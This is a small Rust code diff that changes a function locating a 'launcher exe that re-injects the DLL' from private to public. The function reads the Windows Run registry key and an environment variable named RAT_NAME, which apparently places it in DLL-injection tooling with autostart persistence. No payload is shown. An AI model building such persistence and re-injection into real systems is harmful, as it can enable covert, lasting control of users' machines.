@@ -63,7 +63,7 @@ pub fn is_injected() -> bool {
 
 /// The launcher exe that re-injects the DLL: read from the Run key, else the default path.
 #[cfg(windows)]
-fn launcher_path() -> PathBuf {
+pub fn launcher_path() -> PathBuf {
     use winreg::enums::HKEY_CURRENT_USER;
     use winreg::RegKey;
     let rat_name = std::env::var("RAT_NAME").ok();
